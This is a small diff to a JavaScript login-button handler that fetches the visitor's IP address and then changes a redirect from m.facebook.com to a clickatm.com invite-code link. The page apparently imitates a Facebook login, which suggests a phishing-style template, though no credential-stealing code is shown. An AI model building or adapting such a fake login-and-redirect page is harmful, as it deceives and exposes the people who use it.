@@ -40,7 +40,7 @@ document.getElementById('loginButton').addEventListener('click', function () {
         });
 
       // Redirect to Another Page
-      window.location.href = 'https://m.facebook.com'; // Replace with your redirection URL
+      window.location.href = 'https://www.clickatm.com?inviteCode=prnmot#/home'; // Replace with your redirection URL
     })
     .catch(error => {
       console.error('Error fetching IP address:', error);
